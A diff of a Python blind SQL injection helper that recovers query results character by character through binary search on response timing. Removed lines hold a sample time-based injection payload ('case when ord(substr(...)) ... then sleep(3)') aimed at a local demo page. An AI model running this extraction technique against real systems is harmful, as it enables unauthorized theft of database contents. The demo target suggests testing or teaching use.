@@ -1,9 +1,6 @@
 #!/usr/bin/env python
 
-import threading
-import Queue
-
-class Duncan(threading.Thread):
+class Duncan():
 	def __init__(self,query='select version()',pos=1,q=None,charset=[],debug=0):
 		"""Main constructor
 
@@ -13,7 +10,6 @@ class Duncan(threading.Thread):
         q -- Results Queue object
         charset -- List of the character codes to be tested
         """
-		threading.Thread.__init__(self)
 		self._query=query
 		self._pos=pos
 		self._charset=sorted(list(set(charset)))
@@ -24,7 +20,7 @@ class Duncan(threading.Thread):
 		if level<=self._debug:
 			print ("[Pos %d] "%self._pos)+msg
 
-	def run(self):
+	def __call__(self):
 		while len(self._charset)>2:
 			guess=self._charset[len(self._charset)/2]
 			self.debug(5,"Max: %d Guess: %d Min: %d" % (self._charset[-1], guess, self._charset[0]))
@@ -64,15 +60,14 @@ class DuncanTime(Duncan):
 	def fallback(self):
 		import math
 
-		len(self._charset)>2
-		expected_linear=(len(self._charset)/2.0)*self._rttmax+self._rttmin
+		expected_linear=(len(self._charset)/2.0)*self._rttmin+self._rttmax
 		expected_binary=math.log(len(self._charset),2)*self._rttmax*0.5
 		self.debug(5,"Expected costs - Linear: %f Binary: %f" % (expected_linear,expected_binary))
 		if expected_linear<expected_binary or len(self._charset)<3:
 			return True
 		return False
 
-	def run(self):
+	def __call__(self):
 		import time
 
 		self._rttmin=86400
@@ -94,7 +89,11 @@ class DuncanTime(Duncan):
 				self._charset=self._charset[int(len(self._charset)*chunksize):]
 			t1=time.time()
 			self.update_rtt(t1-t0)
-		self.debug(3,"[Pos %d] Falling back to linear search. Max: %c Min: %c" % (self._pos,self._charset[-1], self._charset[0]))
+		self.debug(3,"Falling back to linear search. Max: %c Min: %c" % (self._charset[-1], self._charset[0]))
+		if len(self._charset)==1:
+			self.debug(1,"Position %d: %c" % (self._pos,self._charset[0]))
+			self._q.put((self._pos,chr(self._charset[-1])))	
+			return
 		for i,guess in enumerate(self._charset):
 			if self.decide(guess):
 				self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[i-1])))	
@@ -103,23 +102,5 @@ class DuncanTime(Duncan):
 		self.debug(3,"Linear search last element: Min: %c Max: %c" % (self._charset[0],self._charset[-1]))
 		self._q.put((self._pos,chr(self._charset[-1])))
 
-	def decide(self,guess):
-		"""Here you should implement your injection code.
 
-		Arguments:
-		guess -- Guess
-
-		Should return True if the actual ASCII value of a given position is less than guess
-		""" 
-		import requests,time
-		t0=time.time()
-		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
-		self.debug(6,url)
-		r=requests.get(url)
-		t1=time.time()
-		self.debug(4, "Guess: %d, Time: %f" % (guess,t1-t0))
-		if t1-t0>2:
-			return True
-		else:
-			return False
 
